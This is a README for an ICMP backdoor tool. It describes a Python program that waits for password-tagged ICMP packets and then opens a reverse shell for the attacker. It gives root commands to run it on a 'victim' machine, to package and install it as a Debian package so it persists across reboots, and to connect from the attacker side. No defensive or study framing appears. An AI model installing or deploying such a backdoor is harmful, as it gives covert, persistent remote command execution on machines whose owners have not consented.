#   ICMP Backdoor

##  Description

The backdoor consists of a a python program that listens on a ICMP socket for a payload with a given password. When it receives a message with the right password attached to it, the program instantiates a ReverseShell object, generates a session id and sends it to the attacker. The attacker can then use this reverse shell by sending ICMP packets whose payloads are composed of this session id, followed by the command to be executed.

##  Instructions

### Victim side

To just run the backdoor manually, run as root:

`python3 backdoor.py --secret p4sswd`

To install the backdoor, therefore making it run after each boot, you can build the debian package and install it on the victim's machine:

`dpkg-deb --build icmp-backdoor`

`dpkg -i icmp-backdoor.deb`

### Attacker side

To connect to the backdoor and start interacting with a reverse shell, run as root:

`python3 enter_backdoor.py --addr 10.0.23.31 --secret p4sswd`